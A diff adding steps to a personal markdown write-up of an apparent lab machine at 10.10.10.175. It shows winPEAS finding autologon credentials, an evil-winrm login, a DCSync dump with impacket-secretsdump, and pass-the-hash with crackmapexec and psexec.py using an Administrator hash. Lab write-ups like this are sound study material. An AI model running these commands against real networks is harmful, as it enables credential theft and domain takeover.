@@ -160,5 +160,44 @@ powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck"
 >[!example]- Result
 >![[Pasted image 20250303223722.png]]
 
-- now with [[winPEAS]]
+- now with [[winPEAS]], and we found a autologgon key
+```
+.\winPEASx64.exe
+```
+>[!example]- Result
+>![[Pasted image 20250304190129.png]]
+
+- lets use this credentials `svc_loanmgr:Moneymakestheworldgoround!`
+```bash
+evil-winrm --ip 10.10.10.175 -u svc_loanmgr -p 'Moneymakestheworldgoround!'
+```
+>[!example]- Result
+>![[Pasted image 20250304190929.png]]
+
+
+# Privilege Escalation
+- So, as we saw on the previus part, this user have 'DCSYNC' with the DC so we can perform a DCSYNC Attack
+>[!example]- Result
+>![[Pasted image 20250304191145.png]]
+
+- DCSYNC Attack using [[impacket-secretsdump]]:
+```bash
+impacket-secretsdump 'EGOTISTICAL-BANK.local'/'svc_loanmgr':'Moneymakestheworldgoround!'@'10.10.10.175'
+```
+>[!example]- Result
+>![[Pasted image 20250304192530.png]]
+
+- Perfect now we have all NT hashes and we can now perform a pash-the-hash attack, we can check it using [[crackmapexec]]
+```bash
+crackmapexec smb 10.10.10.175 -u 'Administrator' -H 'aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e'
+```
+>[!example]- Result
+>![[Pasted image 20250304193028.png]]
+
+- now we can get a shell using [[psexec.py]]
+```bash
+psexec.py EGOTISTICAL-BANK.LOCAL/Administrator@10.10.10.175 -hashes ':823452073d75b9d1cf70ebdf86c7f98e'
+```
+>[!Example]- Result
+>![[Pasted image 20250304193955.png]]
 
